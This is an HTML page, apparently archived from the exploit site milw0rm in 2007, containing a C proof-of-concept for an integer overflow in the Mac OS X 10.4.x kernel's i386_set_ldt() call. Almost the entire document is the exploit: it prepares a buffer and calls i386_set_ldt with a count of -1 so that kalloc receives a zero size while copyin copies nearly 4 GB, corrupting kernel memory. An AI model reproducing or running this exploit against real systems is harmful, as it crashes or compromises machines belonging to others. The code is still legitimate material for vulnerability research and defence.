<html><head><title>Apple Mac OS X 10.4.x Kernel i386_set_ldt() Integer Overflow PoC</title></head><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;architecture/i386/table.h&gt;
#include &lt;i386/user_ldt.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/mman.h&gt;

int
main(void)
{
    union ldt_entry descs;
    char *buf;
    u_long pgsz = sysconf(_SC_PAGESIZE);

    if ((buf = (char *)malloc(pgsz * 4)) == -1) {
        perror(&quot;malloc&quot;);
        exit(EXIT_FAILURE);
    }

    memset(buf, 0x41, pgsz * 4);

    buf = (char *)(((u_long)buf &amp; ~pgsz) + pgsz);

    if (mprotect((char *)((u_long)buf + (pgsz * 2)), (size_t)pgsz,
    PROT_WRITE) == -1) {
        perror(&quot;mprotect&quot;);
        exit(EXIT_FAILURE);
    }

    /*
     * This will result in kalloc() size argument being 0x00000000 and
copyin()
     * size argument being 0xfffffff8.
     */

    if (i386_set_ldt(1024, (union ldt_entry *)&amp;buf, -1) == -1) {
        perror(&quot;i386_set_ldt&quot;);
        exit(EXIT_FAILURE);
    }

    exit(EXIT_SUCCESS);
}

// milw0rm.com [2007-11-16]</pre></html>